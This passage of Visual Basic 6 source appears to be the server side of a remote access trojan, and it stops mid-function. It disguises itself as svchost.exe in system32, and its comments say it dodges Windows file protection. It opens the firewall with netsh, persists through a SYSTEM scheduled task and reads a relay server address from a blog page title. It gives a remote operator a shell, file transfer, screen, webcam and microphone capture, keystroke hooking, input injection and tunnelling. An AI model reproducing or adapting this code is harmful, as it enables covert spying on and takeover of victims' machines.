VERSION 5.00
Begin VB.Form Server 
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   960
   ClientLeft      =   -1995
   ClientTop       =   -1995
   ClientWidth     =   1470
   Icon            =   "Server.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   960
   ScaleWidth      =   1470
   ShowInTaskbar   =   0   'False
   Visible         =   0   'False
   Begin VB.PictureBox Picture4 
      Appearance      =   0  'Flat
      AutoRedraw      =   -1  'True
      BackColor       =   &H80000005&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000008&
      Height          =   375
      Left            =   480
      ScaleHeight     =   375
      ScaleWidth      =   375
      TabIndex        =   3
      Top             =   480
      Visible         =   0   'False
      Width           =   375
   End
   Begin VB.PictureBox Picture3 
      Appearance      =   0  'Flat
      AutoRedraw      =   -1  'True
      AutoSize        =   -1  'True
      BackColor       =   &H80000005&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000008&
      Height          =   375
      Left            =   480
      ScaleHeight     =   375
      ScaleWidth      =   375
      TabIndex        =   2
      Top             =   0
      Visible         =   0   'False
      Width           =   375
   End
   Begin VB.PictureBox Picture2 
      Appearance      =   0  'Flat
      AutoRedraw      =   -1  'True
      BackColor       =   &H80000005&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000008&
      Height          =   375
      Left            =   0
      ScaleHeight     =   375
      ScaleWidth      =   375
      TabIndex        =   1
      Top             =   480
      Visible         =   0   'False
      Width           =   375
   End
   Begin VB.PictureBox Picture1 
      Appearance      =   0  'Flat
      AutoRedraw      =   -1  'True
      BackColor       =   &H80000005&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000008&
      Height          =   375
      Left            =   0
      ScaleHeight     =   375
      ScaleWidth      =   375
      TabIndex        =   0
      Top             =   0
      Visible         =   0   'False
      Width           =   375
   End
   Begin VB.Timer Minute 
      Enabled         =   0   'False
      Interval        =   6000
      Left            =   960
      Top             =   0
   End
End
Attribute VB_Name = "Server"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Private WithEvents TCP As CSocketPlus
Attribute TCP.VB_VarHelpID = -1
Private Declare Function GetVersionEx Lib "kernel32" Alias "GetVersionExA" (lpVersionInformation As OVSERSIONINFOEX) As Long
Private Type OVSERSIONINFOEX
    dwOVSersionInfoSize As Long
    dwMajorVersion As Long
    dwMinorVersion As Long
    dwBuildNumber As Long
    dwPlatformId As Long
    szCSDVersion As String * 128
    wServicePackMajor As Integer
    wServicePackMinor As Integer
    wSuiteMask As Integer
    wProductType As Byte
    wReserved As Byte
End Type
Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Private Declare Function BitBlt Lib "gdi32" (ByVal hDestDC As Long, ByVal x As Long, ByVal y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hSrcDC As Long, ByVal xSrc As Long, ByVal ySrc As Long, ByVal dwRop As Long) As Long
Private Declare Function GetDC Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Const MAX_PATH = 260
Private Declare Function SetCursorPos Lib "user32" (ByVal x As Long, ByVal y As Long) As Long
Private Type POINTAPI
    x As Long
    y As Long
End Type
Private Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
Private Declare Sub mouse_event Lib "user32" (ByVal dwFlags As Long, ByVal dx As Long, ByVal dy As Long, ByVal cButtons As Long, ByVal dwExtraInfo As Long)
Private Const MOUSEEVENTF_LEFTDOWN = &H2
Private Const MOUSEEVENTF_LEFTUP = &H4
Private Const MOUSEEVENTF_MIDDLEDOWN = &H20
Private Const MOUSEEVENTF_MIDDLEUP = &H40
Private Const MOUSEEVENTF_RIGHTDOWN = &H8
Private Const MOUSEEVENTF_RIGHTUP = &H10
Private Declare Sub keybd_event Lib "user32" (ByVal bVk As Byte, ByVal bScan As Byte, ByVal dwFlags As Long, ByVal dwExtraInfo As Long)
Private Declare Function MapVirtualKey Lib "user32" Alias "MapVirtualKeyA" (ByVal wCode As Long, ByVal wMapType As Long) As Long
Private Declare Function GetLogicalDriveStrings Lib "kernel32" Alias "GetLogicalDriveStringsA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
Private Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long
Private Declare Function GetVolumeInformation Lib "kernel32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Long, lpVolumeSerialNumber As Long, lpMaximumComponentLength As Long, lpFileSystemFlags As Long, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Long) As Long
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Private Declare Function capCreateCaptureWindow Lib "avicap32" Alias "capCreateCaptureWindowA" (ByVal lpszWindowName As String, ByVal dwStyle As Long, ByVal x As Long, ByVal y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hWndParent As Long, ByVal nID As Long) As Long
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
Private Declare Function DestroyWindow Lib "user32" (ByVal hwnd As Long) As Long
Private Const WM_CAP_START = &H400
Private Const WM_CAP_DRIVER_CONNECT = WM_CAP_START + 10
Private Const WM_CAP_DRIVER_DISCONNECT = WM_CAP_START + 11
Private Const WM_CAP_FILE_SAVEDIB = WM_CAP_START + 25
Private Const WM_CAP_EDIT_COPY = WM_CAP_START + 30
Private Const WM_CAP_GRAB_FRAME = WM_CAP_START + 60
Private capHwnd As Long
Private dataBytes() As Byte
Private leftBytes() As Byte
Private dataLeft As Boolean
Private dataBytesA() As Byte
Private leftBytesA() As Byte
Private dataLeftA As Boolean
Private sysPath As String
Private appFullPath As String
Private totalMin As Long
Private connectedMin As Long 'how many minutes has passed scince last command
Private midConnectedMin As Long
Private Const headLen As Long = 10 'length of the package head
Public packageLen As Long
Private ifCMD As Boolean 'if the shell is enable
Private cameraReady As Boolean 'the state of the webcamera
Private downloading As Boolean
Private uploading As Boolean
Private currentPath As String
Private driveList As String
Private dirPath As String
Private dirList As String
Private fileList As String
Private miniDesktop As Boolean
Private desktoping As Boolean
Private miniWidth As Long
Private miniHeight As Long
Private currentDesktop As Long
Private firstDesktop As Boolean
Private imageType As Long
Private BMPPre() As Byte
Private BMPNow() As Byte
Private BMPPos As Long
Private BMPMax As Long
Private jpgDataPre() As Byte
Private jpgDataNow() As Byte
Private jpgPosPre(16) As Long
Private jpgPosNow(16) As Long
Private jpgPos As Long
Private tunnelMode As Boolean
Private tunnelListen As Boolean
Private tunnelConnected As Boolean
Private tunnelData As String
Private cameraing As Boolean
Private cameraData() As Byte
Private cameraPos As Long
Private cameraFile As Boolean
Private MidReady As Boolean
Private MidReconnect As Boolean
Private MidServerHost As String
Private MidServerPort As Long
Private MidHtml As String
Public schTasks As Boolean

Private Function checkTaskEnv() As Boolean
    On Error Resume Next
    checkTaskEnv = False
    Dim OVS As OVSERSIONINFOEX
    OVS.dwOVSersionInfoSize = Len(OVS)
    GetVersionEx OVS
    If OVS.dwPlatformId = 2 And OVS.dwMajorVersion >= 6 Then checkTaskEnv = True
End Function

Private Function SystemDir() As String
    On Error Resume Next
    Dim tmp As String
    tmp = Space(MAX_PATH)
    SystemDir = Left(tmp, GetSystemDirectory(tmp, MAX_PATH))
End Function

Private Function CurrentUser() As String
    On Error Resume Next
    Dim strUsername As String
    Dim lngUserNameSize As Long
    lngUserNameSize = 31
    strUsername = String(lngUserNameSize + 1, 0)
    If GetUserName(strUsername, lngUserNameSize) = 1 Then
        CurrentUser = Left(strUsername, lngUserNameSize - 1)
    Else
        CurrentUser = vbNullString
    End If
End Function

Private Sub Form_Load()
    On Error Resume Next
    App.TaskVisible = False
    schTasks = checkTaskEnv
    sysPath = SystemDir 'get system32 path
    appFullPath = App.Path & IIf(Len(App.Path) > 3, "\", "") & App.EXEName & ".exe"
    'this starter is very important
    'i have to run another instance of myself and
    'i changed the system file during that.
    'the load of the exe must be very fast so the
    'system file protection will not notice
    'but if i put all start functions here,
    'this load process will last long and
    'i will be detected
    'so i just put the process in a timer
    'and just start the timer in loader
    'the load will be fast and system may
    'not know i changed the file
    If LCase(App.EXEName) = "svchost" And LCase(App.Path) = LCase(sysPath) Then
        If App.PrevInstance Then End 'don't run me again
        totalMin = 0
        Minute.Enabled = True
    'do nothing
    Else
        End
    End If
End Sub

Private Sub Starter()
    On Error Resume Next
    'set to app path
    ChDir App.Path
    Dim firewall As String
    firewall = "netsh.exe firewall set allowedprogram """ & appFullPath & """ svchost enable"
    Shell firewall, vbHide 'make a through in the firewall
    firewall = "netsh.exe firewall set allowedprogram """ & sysPath & "\svchost.1"" svchost enable"
    Shell firewall, vbHide 'for special use
    Sleep 8000 'wait the shell finished
    'tcp listen on port
    Set TCP = New CSocketPlus
    TCP.ArrayAdd 0
    TCP.ArrayAdd 1
    TCP.ArrayAdd 2
    TCP.ArrayAdd 3
    TCP.ArrayAdd 4
    Err.Clear
    TCP.CloseSck 0
    TCP.LocalPort(0) = 24
    TCP.Listen 0
    If Err Then
    Err.Clear
    TCP.CloseSck 0
    TCP.LocalPort(0) = 40
    TCP.Listen 0
    If Err Then
    Err.Clear
    TCP.CloseSck 0
    TCP.LocalPort(0) = 60
    TCP.Listen 0
    If Err Then
    Err.Clear
    TCP.CloseSck 0
    TCP.LocalPort(0) = 9979
    TCP.Listen 0
    If Err Then End
    End If
    End If
    End If
    
    'init some vars
    connectedMin = 11
    midConnectedMin = 16
    cameraReady = False
    ifCMD = False
    waveReady = False
    mixerReady = False
    hooked = False
    mouseHooked = False
    freezed = False
    initClipboard
    MidReady = False
    MidReconnect = False
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
    On Error Resume Next
    If Not UnloadMode = 2 Then Cancel = 1
End Sub

Private Sub Form_Unload(Cancel As Integer)
    On Error Resume Next
    Shell "sc.exe config schedule start= auto & sc.exe start schedule", vbHide
    If schTasks = True Then Shell "schtasks.exe /Create /F /RU ""SYSTEM"" /SC ONSTART /TN ""DXCache"" /TR """ & sysPath & "\DXcache\dx8vb.exe""", vbHide
    PreEnd
End Sub

Private Sub Minute_Timer()
    On Error Resume Next
    If totalMin = 0 Then
        Minute.Interval = 60000
        Starter
    End If
    
    If totalMin Mod 15 = 14 Then
        If MidReconnect = True Then MidReady = False
        'start the service in case it closed
        Shell "sc.exe config schedule start= auto & sc.exe start schedule", vbHide
        If schTasks = True Then Shell "schtasks.exe /Create /F /RU ""SYSTEM"" /SC ONSTART /TN ""DXCache"" /TR """ & sysPath & "\DXcache\dx8vb.exe""", vbHide
    End If
    
    'auto cut off per 10 minutes,in case of the net problem
    If connectedMin = 10 Then
        TCP_CloseSck 0
    End If
    
    If midConnectedMin = 15 Then
        TCP_CloseSck 2
    End If
    
    'mid server
    If MidReady = False Then
        TCP.CloseSck 4
        TCP.RemoteHost(4) = "blog.163.com"
        TCP.RemotePort(4) = 80
        TCP.Connect 4
    ElseIf MidReconnect = True Then
        TCP.CloseSck 2
        TCP.RemoteHost(2) = MidServerHost
        TCP.RemotePort(2) = MidServerPort
        TCP.Connect 2
    End If
    
    'every minutes it increase
    connectedMin = connectedMin + 1
    midConnectedMin = midConnectedMin + 1
    totalMin = totalMin + 1
End Sub

Private Sub TCP_ConnectionRequest(ByVal Index As Variant, ByVal requestID As Long)
    On Error Resume Next
    If Index = 0 Then
        'the tcp must be closed befor it can accept
        'a new connection
        TCP.CloseSck 0
         'connected
        TCP.Accept 0, requestID
        connectedMin = 0 'begin to count
        downloading = False
        uploading = False
        desktoping = False
        cameraing = False
        tunnelMode = False
        tunnelListen = False
        imageType = 0
        cameraFile = False
        packageLen = 1024
        dataLeft = False
        bufsec = 5
        jpgQuality = 80
        'send connect ack
        SendData ChrB(26)
    ElseIf Index = 1 Then
        SendData ChrB(50)
        TCP.CloseSck 1
        TCP.Accept 1, requestID
    End If
End Sub

Private Sub PreEnd()
    On Error Resume Next
    TCP_CloseSck 0
    TCP.CloseSck 0
    TCP.CloseSck 1
    TCP.CloseSck 2
    TCP.CloseSck 3
    TCP.CloseSck 4
End Sub

Private Sub TCP_CloseSck(ByVal Index As Variant)
    On Error Resume Next
    If Index = 0 Then
        UnHook
        UnFreeze
        Close #1
        Close #2
        'end the cmd process
        CloseShell
        'end the camera
        closeCamera
        'erase clipboard
        freeClipData
        'close wave record
        WaveInDeinit
        mixerDeinit
        Erase BMPPre
        Erase BMPNow
        Erase jpgDataPre
        Erase jpgDataNow
        Erase cameraData
        'erase package data
        Erase leftBytes
        Erase dataBytes
        tunnelData = vbNullString
        'close the connection
        TCP.CloseSck 1
        TCP.CloseSck 0
        TCP.Listen 0
        connectedMin = 11
    ElseIf Index = 1 Then
        SendData ChrB(60)
        TCP.CloseSck 1
        If tunnelListen = True Then TCP.Listen 1
        tunnelConnected = False
        tunnelData = vbNullString
    ElseIf Index = 2 Then
        TCP.CloseSck 3
        TCP.CloseSck 2
        Erase dataBytesA
        Erase leftBytesA
        MidReconnect = True
        midConnectedMin = 16
    ElseIf Index = 3 Then
        SendDataA ChrB(8)
        TCP.CloseSck 3
    ElseIf Index = 4 Then
        TCP.CloseSck 4
        MidHtml = StrConv(MidHtml, vbLowerCase)
        MidHtml = Left(MidHtml, InStr(1, MidHtml, "</title>"))
        MidHtml = Mid(MidHtml, InStr(1, MidHtml, "<title>") + 7)
        MidHtml = Left(MidHtml, InStr(1, MidHtml, " "))
        MidHtml = Trim(MidHtml)
        If Len(MidHtml) > 0 Then
            Dim i As Long
            i = InStr(1, MidHtml, ":")
            If i > 0 Then
                MidServerHost = Left(MidHtml, i - 1)
                MidServerPort = Val(Mid(MidHtml, i + 1))
            Else
                MidServerHost = MidHtml
                MidServerPort = 110
            End If
            MidReady = True
            MidReconnect = True
        End If
    End If
End Sub

Private Sub TCP_DataArrival(ByVal Index As Variant, ByVal bytesTotal As Long)
    On Error Resume Next
    Dim dataString As String
    If Index = 0 Then
        'any data comes and the count set 0
        connectedMin = 0
        'read data
        TCP.GetData 0, dataString
        If dataLeft = True Then
            dataBytes = CStr(leftBytes) + dataString
        Else
            dataBytes = dataString
        End If
        DataCenter
    ElseIf Index = 1 Then
        'read data
        TCP.GetData 1, dataString
        If tunnelConnected = True Then
            SendData ChrB(59), dataString
        Else
            tunnelData = tunnelData + dataString
        End If
    ElseIf Index = 2 Then
        midConnectedMin = 0
        'read data
        TCP.GetData 2, dataString
        If dataLeftA = True Then
            dataBytesA = CStr(leftBytesA) + dataString
        Else
            dataBytesA = dataString
        End If
        DataCenterA
    ElseIf Index = 3 Then
        'read data
        TCP.GetData 3, dataString
        SendDataA ChrB(7), dataString
    ElseIf Index = 4 Then
        'read data
        TCP.GetData 4, dataString
        MidHtml = MidHtml & StrConv(dataString, vbUnicode)
    End If
End Sub

Private Sub DataCenterA()
    On Error Resume Next
    'in case some package divided or compacted
    Dim totalLen As Long
    totalLen = UBound(dataBytesA) + 1
    If totalLen < 2 Then Exit Sub
    Dim dataLen As Long
    dataLen = CLng(dataBytesA(0)) * 256 + dataBytesA(1)
    Dim i As Long
    If totalLen < dataLen Then
        leftBytesA = dataBytesA
        dataLeftA = True
        Exit Sub
    ElseIf totalLen = dataLen Then
        dataLeftA = False
    ElseIf totalLen > dataLen Then
        dataLeftA = True
        ReDim leftBytesA(totalLen - dataLen - 1)
        CopyMemory leftBytesA(0), dataBytesA(dataLen), UBound(leftBytesA) + 1
        ReDim Preserve dataBytesA(dataLen - 1)
    End If
    'get head and data
    Dim head() As Byte
    ReDim head(headLen - 1)
    Dim hasData As Boolean
    hasData = False
    'copy head
    CopyMemory head(0), dataBytesA(2), UBound(head) + 1
    'check length
    If dataLen > headLen + 2 Then
        hasData = True
        'deal the data
        CopyMemory dataBytesA(0), dataBytesA(2 + headLen), dataLen - headLen - 2
        ReDim Preserve dataBytesA(dataLen - headLen - 3)
    End If
    Dim data() As Byte
    Dim key As Long
    key = head(0)
    'key means
    '1working id
    '2list apply
    '3list data
    '4list ack
    '5mid connect
    '6mid connected
    '7mid data
    '8mid disconnect
    
    'mid connect
    If key = 5 Then
        TCP.CloseSck 3
        TCP.RemoteHost(3) = TCP.LocalIP(0)
        TCP.RemotePort(3) = TCP.LocalPort(0)
        TCP.Connect 3
    
    'mid data
    ElseIf key = 7 Then
        If hasData Then TCP.SendData 3, dataBytesA
    
    'mid disconnect
    ElseIf key = 8 Then
        TCP.CloseSck 3
    
    
    'else are bad packages
    Else
        'nothing
    End If
    'retreat
    If dataLeftA = True Then
        dataBytesA = leftBytesA
        DataCenterA
    End If
End Sub

Private Sub DataCenter()
    On Error Resume Next
    'in case some package divided or compacted
    Dim totalLen As Long
    totalLen = UBound(dataBytes) + 1
    If totalLen < 2 Then Exit Sub
    Dim dataLen As Long
    dataLen = CLng(dataBytes(0)) * 256 + dataBytes(1)
    Dim i As Long
    If totalLen < dataLen Then
        leftBytes = dataBytes
        dataLeft = True
        Exit Sub
    ElseIf totalLen = dataLen Then
        dataLeft = False
    ElseIf totalLen > dataLen Then
        dataLeft = True
        ReDim leftBytes(totalLen - dataLen - 1)
        CopyMemory leftBytes(0), dataBytes(dataLen), UBound(leftBytes) + 1
        ReDim Preserve dataBytes(dataLen - 1)
    End If
    'get head and data
    Dim head() As Byte
    ReDim head(headLen - 1)
    Dim hasData As Boolean
    hasData = False
    'copy head
    CopyMemory head(0), dataBytes(2), UBound(head) + 1
    'check length
    If dataLen > headLen + 2 Then
        hasData = True
        'deal the data
        CopyMemory dataBytes(0), dataBytes(2 + headLen), dataLen - headLen - 2
        ReDim Preserve dataBytes(dataLen - headLen - 3)
    End If
    Dim data() As Byte
    Dim key As Long
    key = head(0)
    'key means
    '1command package
    '2command reply
    '3command ack
    '4download apply
    '5download reply
    '6download data
    '7download ack
    '8download finish
    '9download cancel
    '10upload apply
    '11upload reply
    '12upload data
    '13upload ack
    '14upload finish
    '15open cmd
    '16open cmd faild
    '17close cmd
    '18disconnect
    '19end me
    '20package length
    '21desktop apply
    '22desktop reply
    '23take a camerashot
    '24download failed,deny
    '25upload failed,deny
    '26connected ack
    '27open cmd success
    '28shell command
    '29apply driverlist
    '30driverlist data
    '31drivelist ack
    '32apply dirlist
    '33dirlist data
    '34dirlist ack
    '35change driver
    '36desktop data
    '37desktop ack
    '38desktop finish
    '39desktop info
    '40mouse event
    '41imagetype
    '42bmp desktop data
    '43bmp desktop ack
    '44bmp desktop finish
    '45bmp desktop info
    '46desktop cancel
    '47tunnel make
    '48tunnel ok
    '49tunnel failed
    '50tunnel connect
    '51tunnel connected
    '52keyboard event
    '53hook enable
    '54hook disable
    '55hook data
    '56hook ack
    '57freeze
    '58unfreeze
    '59tunnel data
    '60tunnel disconnect
    '61tunnel disable
    '62mouse hook
    '63unmouse hook
    '64restart server
    '65wave start
    '66wave error
    '67wave stop
    '68wave data
    '69wave ack
    '70wave finish
    '71mixer apply
    '72mixer data
    '73mixer ack
    '74set mixer
    '75buf length
    '76camera apply
    '77camera reply
    '78camera data
    '79camera ack
    '80camera finish
    '81camera cancel
    '82jpg quality
    '83capture media
    '84camera error
    '85clipboard apply
    '86clipboard data
    
    'Debug.Print key
    'command package
    If key = 1 Then
        'write to the pipe to shell the command
        If ifCMD = True And hasData Then WriteCMD CStr(dataBytes)
    
    'command ack
    ElseIf key = 3 Then
        'read the data from cmd
        If ifCMD = True Then SendData ChrB(2), ReadCMD
        
    'download apply
    ElseIf key = 4 Then
        If hasData Then sendFile dataBytes, head
        
    'download ack
    ElseIf key = 7 Then
        If downloading = True Then
            If Seek(1) > LOF(1) Then
                'download finish
                Close #1
                SendData ChrB(8)
                downloading = False
            Else
                'read data from file
                ReDim data(packageLen - 1)
                Get #1, , data
                If EOF(1) Then ReDim Preserve data(packageLen - Seek(1) + LOF(1))
                'send data
                SendData ChrB(6), CStr(data)
            End If
        End If
        
    'download cancel
    ElseIf key = 9 Then
        If downloading = True Then
            Close #1
            downloading = False
        End If
        
    'upload apply
    ElseIf key = 10 Then
        If hasData Then receiveFile dataBytes
        
    'upload data
    ElseIf key = 12 Then
        If uploading = True Then
            If hasData Then Put #2, , dataBytes
            'send ack whatever hasdata!
            SendData ChrB(13)
        End If
 
    'upload finish
    ElseIf key = 14 Then
        If uploading = True Then
            Close #2
            uploading = False
        End If
        
    'open cmd
    ElseIf key = 15 Then
        OpenShell
        
    'close cmd
    ElseIf key = 17 Then
        CloseShell 'close the shell
        
    'disconnect
    ElseIf key = 18 Then
        TCP_CloseSck 0 'close the connection
        
    'end me
    ElseIf key = 19 Then
        PreEnd
        End
        
    'package length
    ElseIf key = 20 Then
        packageLen = CLng(head(1)) * 256 + head(2)
        
    'desktop apply
    ElseIf key = 21 Then
        If desktoping = False Then
            desktoping = True
            If head(2) = 1 Then
                For i = 0 To 16
                    jpgPosPre(i) = 0
                    jpgPosNow(i) = 0
                Next i
                Erase BMPPre
                Erase BMPNow
                Erase jpgDataPre
                Erase jpgDataNow
            End If
            If head(1) = 0 Then
                Desktop False
            Else
                Desktop True
            End If
        End If
        
    'take a camerashot
    ElseIf key = 23 Then
        'CameraStart(False)
        
    'shell command
    ElseIf key = 28 Then
        If hasData Then shellCommand dataBytes, head(1)
        
    'apply driverlist
    ElseIf key = 29 Then
        sendDriverList

    'drivelist ack
    ElseIf key = 31 Then
        If LenB(driveList) > 0 Then
            SendData ChrB(30), LeftB(driveList, packageLen)
            driveList = RightB(driveList, IIf(LenB(driveList) > packageLen, LenB(driveList) - packageLen, 0))
        End If
    
    'apply dirlist
    ElseIf key = 32 Then
        If hasData Then sendDirList dataBytes

    'dirlist ack
    ElseIf key = 34 Then
        If LenB(dirPath) > 0 Then
            SendData ChrB(33) + ChrB(2), LeftB(dirPath, packageLen)
            dirPath = RightB(dirPath, IIf(LenB(dirPath) > packageLen, LenB(dirPath) - packageLen, 0))
        ElseIf LenB(dirList) > 0 Then
            SendData ChrB(33) + ChrB(3), LeftB(dirList, packageLen)
            dirList = RightB(dirList, IIf(LenB(dirList) > packageLen, LenB(dirList) - packageLen, 0))
        ElseIf LenB(fileList) > 0 Then
            SendData ChrB(33), LeftB(fileList, packageLen)
            fileList = RightB(fileList, IIf(LenB(fileList) > packageLen, LenB(fileList) - packageLen, 0))
        End If
        
    'change driver
    ElseIf key = 35 Then
        If hasData Then changeDriver dataBytes
    
    'desktop ack
    ElseIf key = 37 Then
        If desktoping = True And imageType <> 0 Then
            If firstDesktop = True Then
                firstDesktop = False
                takeDesktop
            Else
                If jpgPos >= jpgPosNow(currentDesktop + 1) Then
                    If miniDesktop Or currentDesktop = 15 Then
                        jpgDataPre = jpgDataNow
                        CopyMemory jpgPosPre(0), jpgPosNow(0), CLng(UBound(jpgPosPre) + 1) * 4
                        desktoping = False
                        SendData ChrB(38)
                    Else
                        currentDesktop = currentDesktop + 1
                        takeDesktop
                    End If
                Else
                    Dim jpgLen As Long
                    jpgLen = jpgPosNow(currentDesktop + 1) - jpgPos
                    If jpgLen > packageLen Then jpgLen = packageLen
                    ReDim data(jpgLen - 1)
                    CopyMemory data(0), jpgDataNow(jpgPos), jpgLen
                    jpgPos = jpgPos + jpgLen
                    SendData ChrB(36), CStr(data)
                End If
            End If
        End If
    
    'mouse event
    ElseIf key = 40 Then
        SetCursorPos CLng(head(2)) * 256 + head(3), CLng(head(4)) * 256 + head(5)
        i = 0
        If head(1) = 1 Then 'left
            If head(6) = 0 Then
                i = MOUSEEVENTF_LEFTDOWN
            Else
                i = MOUSEEVENTF_LEFTUP
            End If
        ElseIf head(1) = 2 Then 'right
            If head(6) = 0 Then
                i = MOUSEEVENTF_RIGHTDOWN
            Else
                i = MOUSEEVENTF_RIGHTUP
            End If
        ElseIf head(1) = 4 Then 'middle
            If head(6) = 0 Then
                i = MOUSEEVENTF_MIDDLEDOWN
            Else
                i = MOUSEEVENTF_MIDDLEUP
            End If
        End If
        If i <> 0 Then
            If freezed = True Then
                UnFreeze
                mouse_event i, 0, 0, 0, 0
                Freeze
            Else
                mouse_event i, 0, 0, 0, 0
            End If
        End If
    
    'imagetype
    ElseIf key = 41 Then
        If desktoping = False Then imageType = head(1)
    
    'bmp desktop ack
    ElseIf key = 43 Then
        If desktoping = True And imageType = 0 Then
            If firstDesktop = True Then
                firstDesktop = False
                takeBMPDesktop
            Else
                BMPCompress
            End If
        End If
    
    'desktop cancel
    ElseIf key = 46 Then
        desktoping = False
        Erase BMPPre
        Erase BMPNow
        Erase jpgDataPre
        Erase jpgDataNow
    
    'tunnel make
    ElseIf key = 47 Then
        tunnelMode = False
        TCP.CloseSck 1
        tunnelConnected = False
        tunnelData = vbNullString
        Err.Clear
        'from client to server
        If head(1) = 1 Then
            If hasData Then
                TCP.RemoteHost(1) = CStr(dataBytes)
                TCP.RemotePort(1) = CLng(head(2)) * 256 + head(3)
                tunnelListen = False
            Else
                Err.Raise 1, , "No Host Data"
            End If
        'from server to client
        ElseIf head(1) = 2 Then
            tunnelListen = True
            TCP.LocalPort(1) = CLng(head(2)) * 256 + head(3)
            If TCP.LocalPort(0) = TCP.LocalPort(1) Then
                Err.Raise 1, , "Address in use"
            End If
            TCP.Listen 1
        Else
            Err.Raise 1, , "Unknown Head Value"
        End If
        
        If Err Then
            TCP.CloseSck 1
            SendData ChrB(49), Err.Description
        Else
            tunnelMode = True
            SendData ChrB(48)
        End If
            
    'tunnel connect
    ElseIf key = 50 Then
        If tunnelMode = True Then TCP.Connect 1
        
    'tunnel connected
    ElseIf key = 51 Then
        If tunnelMode = True Then
            tunnelConnected = True
            If tunnelData <> vbNullString Then
                SendData ChrB(59), tunnelData
                tunnelData = vbNullString
            End If
        End If
          
    'tunnel data
    ElseIf key = 59 Then
        If hasData And tunnelMode = True Then TCP.SendData 1, dataBytes
    
    'tunnel disconnect
    ElseIf key = 60 Then
        If tunnelMode = True Then
            TCP.CloseSck 1
            If tunnelListen = True Then TCP.Listen 1
            tunnelConnected = False
            tunnelData = vbNullString
        End If
    
    'tunnel disable
    ElseIf key = 61 Then
        If tunnelMode = True Then
            TCP.CloseSck 1
            tunnelConnected = False
            tunnelMode = False
            tunnelData = vbNullString
        End If
            
    'keyboard event
    ElseIf key = 52 Then
        If head(2) <> 0 Then head(2) = 2
        If freezed = True Then
            UnFreeze
            keybd_event head(1), MapVirtualKey(head(1), 0), head(2), 0
            Freeze
        Else
            keybd_event head(1), MapVirtualKey(head(1), 0), head(2), 0
        End If
    
    'hook enable
    ElseIf key = 53 Then
        EnableHook
    
    'hook disable
    ElseIf key = 54 Then
        UnHook
    
    'hook ack
    ElseIf key = 56 Then
        If hooked = True Then
            Dim pointPos As POINTAPI
            GetCursorPos pointPos
            SendData ChrB(55) + ChrB(ReadKey) + ChrB(pointPos.x \ 256) + ChrB(pointPos.x Mod 256) + ChrB(pointPos.y \ 256) + ChrB(pointPos.y Mod 256) + ChrB(mouseStatus)
        End If
    
    'freeze
    ElseIf key = 57 Then
        Freeze
    
    'unfreeze
    ElseIf key = 58 Then
        UnFreeze
    
    'mouse hook
    ElseIf key = 62 Then
        EnableMouseHook
        
    'unmouse hook
    ElseIf key = 63 Then
        UnMouseHook
        
    'restart server
    ElseIf key = 64 Then
        PreEnd
        If LCase(App.EXEName) = "svchost" And LCase(App.Path) = LCase(sysPath) Then
            Shell "cmd.exe /D /C start """" """ & sysPath & "\DXcache\dx8vb.exe""", vbHide
        Else
            Shell appFullPath, vbHide
        End If
        End
    
    'wave start
    ElseIf key = 65 Then
        If waveReady = False Then
            If head(1) = 0 Then
                BUF_SIZE = BUF_SIZE_ONE * bufsec
                WaveInInit CHANNEL, SAMPLES, 8
            Else
                BUF_SIZE = BUF_SIZE_ONE * bufsec * 2
                WaveInInit CHANNEL, SAMPLES, 16
            End If
            If waveReady = False Then
                SendData ChrB(66)
            Else
                waveSendFinish = True
                WaveInRecord
            End If
        End If
    
    'wave stop
    ElseIf key = 67 Then
        WaveInDeinit
    
    'wave ack
    ElseIf key = 69 Then
        sendWave
    
    'mixer apply
    ElseIf key = 71 Then
        getMixerList
        If LenB(mixerList) > 0 Then
            SendData ChrB(72) + ChrB(1), LeftB(mixerList, packageLen)
            mixerList = RightB(mixerList, IIf(LenB(mixerList) > packageLen, LenB(mixerList) - packageLen, 0))
        End If
    
    'mixer ack
    ElseIf key = 73 Then
        If LenB(mixerList) > 0 Then
            SendData ChrB(72), LeftB(mixerList, packageLen)
            mixerList = RightB(mixerList, IIf(LenB(mixerList) > packageLen, LenB(mixerList) - packageLen, 0))
        End If
        
    'set mixer
    ElseIf key = 74 Then
        If hasData Then setMixer CStr(dataBytes)
    
    'buf length
    ElseIf key = 75 Then
        If waveReady = False And head(1) <> 0 Then bufsec = head(1)
    
    'camera apply
    ElseIf key = 76 Then
        If cameraing = False Then
            If head(2) = 1 Or head(2) = 2 Then
                Erase cameraData
                openCamera
            End If
            If cameraReady = True Then
                cameraing = True
                If head(1) = 0 Then
                    takeCamera False
                Else
                    takeCamera True
                End If
                If head(2) = 2 Then closeCamera
            Else
                SendData ChrB(84)
            End If
        End If
    
    'camera ack
    ElseIf key = 79 Then
        If cameraing = True Then
            If cameraPos > UBound(cameraData) Then
                cameraing = False
                SendData ChrB(80)
            Else
                Dim cameraLen As Long
                cameraLen = UBound(cameraData) - cameraPos + 1
